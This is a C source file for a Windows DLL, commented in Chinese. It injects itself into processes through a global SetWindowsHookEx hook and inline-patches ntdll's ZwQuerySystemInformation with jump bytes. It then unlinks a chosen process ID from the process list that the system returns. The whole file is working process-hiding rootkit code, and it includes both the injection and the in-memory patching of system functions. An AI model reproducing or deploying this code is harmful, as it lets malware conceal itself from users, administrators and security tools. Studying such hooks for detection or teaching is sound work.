#include <Windows.h>
#include <winternl.h>

#define DLL_EXPORT
#include "HookZwQuerySystemInformation.h"

#pragma data_seg(".Shared")
DWORD g_dwProcessIdHide = -1;
#pragma data_seg()

#pragma comment(linker, "/SECTION:.Shared,RWS")

// ZwQuerySystemInformation函数指针
typedef NTSTATUS(NTAPI* pfnZwQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

// 全局变量
HINSTANCE g_hMod;
HHOOK g_hHook;
BYTE g_bDataJmp32[5] = { 0 };
BYTE g_bDataJmp64[12] = { 0 };

// 消息钩子函数
LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);
// Hook ZwQuerySystemInformation
BOOL SetJmp();
// UnHook ZwQuerySystemInformation
BOOL ResetJmp();
// 自定义函数，对原ZwQuerySystemInformation函数获取到的进程信息列表进行处理
NTSTATUS NTAPI HookZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hMod = hModule;
        SetJmp();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        ResetJmp();
        break;
    }

    return TRUE;
}

// 导出函数
BOOL InstallHook(int idHook, DWORD dwThreadId, DWORD dwProcessId)
{
    if (!g_hHook)
    {
        g_hHook = SetWindowsHookEx(idHook, GetMsgProc, g_hMod, dwThreadId);
        if (!g_hHook)
            return FALSE;

        g_dwProcessIdHide = dwProcessId;
    }

    return TRUE;
}

BOOL UninstallHook()
{
    if (g_hHook)
    {
        if (!UnhookWindowsHookEx(g_hHook))
            return FALSE;
    }

    g_hHook = NULL;
    return TRUE;
}

// 内部函数
LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL SetJmp()
{
    pfnZwQuerySystemInformation ZwQuerySystemInformation = NULL;
    DWORD dwOldProtect;

    ZwQuerySystemInformation = (pfnZwQuerySystemInformation)
        GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "ZwQuerySystemInformation");

#ifndef _WIN64
    BYTE bDataJmp[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
    *(PINT_PTR)(bDataJmp + 1) = (INT_PTR)HookZwQuerySystemInformation -
        (INT_PTR)ZwQuerySystemInformation - 5;
    // 保存ZwQuerySystemInformation函数的前5个字节
    memcpy_s(g_bDataJmp32, sizeof(g_bDataJmp32), ZwQuerySystemInformation, sizeof(bDataJmp));
#else
    BYTE bDataJmp[12] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
    *(PINT_PTR)(bDataJmp + 2) = (INT_PTR)HookZwQuerySystemInformation;
    // 保存ZwQuerySystemInformation函数的前12个字节
    memcpy_s(g_bDataJmp64, sizeof(g_bDataJmp64), ZwQuerySystemInformation, sizeof(bDataJmp));
#endif

    // 修改页面保护属性，写入Jmp数据
    VirtualProtect(ZwQuerySystemInformation, sizeof(bDataJmp), PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy_s(ZwQuerySystemInformation, sizeof(bDataJmp), bDataJmp, sizeof(bDataJmp));
    VirtualProtect(ZwQuerySystemInformation, sizeof(bDataJmp), dwOldProtect, &dwOldProtect);

    return TRUE;
}

BOOL ResetJmp()
{
    pfnZwQuerySystemInformation ZwQuerySystemInformation = NULL;
    DWORD dwOldProtect;

    ZwQuerySystemInformation = (pfnZwQuerySystemInformation)
        GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "ZwQuerySystemInformation");

#ifndef _WIN64
    VirtualProtect(ZwQuerySystemInformation, sizeof(g_bDataJmp32), PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy_s(ZwQuerySystemInformation, sizeof(g_bDataJmp32), g_bDataJmp32, sizeof(g_bDataJmp32));
    VirtualProtect(ZwQuerySystemInformation, sizeof(g_bDataJmp32), dwOldProtect, &dwOldProtect);
#else
    VirtualProtect(ZwQuerySystemInformation, sizeof(g_bDataJmp64), PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy_s(ZwQuerySystemInformation, sizeof(g_bDataJmp64), g_bDataJmp64, sizeof(g_bDataJmp64));
    VirtualProtect(ZwQuerySystemInformation, sizeof(g_bDataJmp64), dwOldProtect, &dwOldProtect);
#endif

    return TRUE;
}

NTSTATUS NTAPI HookZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    pfnZwQuerySystemInformation ZwQuerySystemInformation = NULL;
    NTSTATUS status = -1;
    PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;

    ZwQuerySystemInformation = (pfnZwQuerySystemInformation)
        GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "ZwQuerySystemInformation");

    // 因为首先需要执行原ZwQuerySystemInformation函数，所以先恢复函数首部数据
    ResetJmp();
    status = ZwQuerySystemInformation(SystemInformationClass, SystemInformation,
        SystemInformationLength, ReturnLength);
    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation)
    {
        pCur = pPrev = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        while (TRUE)
        {
            // 如果是要隐藏的进程
            if ((DWORD)pCur->UniqueProcessId == g_dwProcessIdHide)
            {
                if (pCur->NextEntryOffset == 0)
                    pPrev->NextEntryOffset = 0;
                else
                    pPrev->NextEntryOffset += pCur->NextEntryOffset;
            }
            else
            {
                pPrev = pCur;
            }

            if (pCur->NextEntryOffset == 0)
                break;

            pCur = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pCur + pCur->NextEntryOffset);
        }
    }

    // Hook ZwQuerySystemInformation
    SetJmp();
    return status;
}